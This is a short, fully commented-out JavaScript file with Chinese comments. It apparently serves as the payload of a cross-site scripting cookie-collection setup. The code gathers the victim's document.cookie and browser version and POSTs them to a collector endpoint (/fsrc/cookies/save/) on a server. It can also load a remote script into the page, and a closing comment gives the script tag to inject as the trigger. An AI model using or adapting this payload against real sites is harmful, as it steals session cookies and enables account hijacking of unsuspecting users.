// // $(function() {
// //   // 接受订单
// // });
// $(document).ready(function () {
//   alert(1);
//   var tag_from = 1;
//   if (tag_from == 0) {
//     var s = document.createElement("script");
//     s.src = "http://127.0.0.1:8000/static/js/from.js";
//     document.getElementsByTagName("HEAD")[0].appendChild(s);
//   }
//   var cookies_data = {};
//   cookies_data["u_cookie"] = document.cookie
//   cookies_data["u_appVersion"] = navigator.appVersion
//   console.log(cookies_data)
//   $.ajax({
//     type: 'POST',
//     url: 'http://127.0.0.1:8000/fsrc/cookies/save/',
//     data: cookies_data,
//     dataType: 'json',
//     success: function () {
//       console.log("thank you!")
//     },
//     error: function () {
//       console.log("系统错误");
//     },
//     timeout: 1000
//   });


//   // 触发条件    <script src="http://127.0.0.1:8000/static/js/do.js"></script>

// });

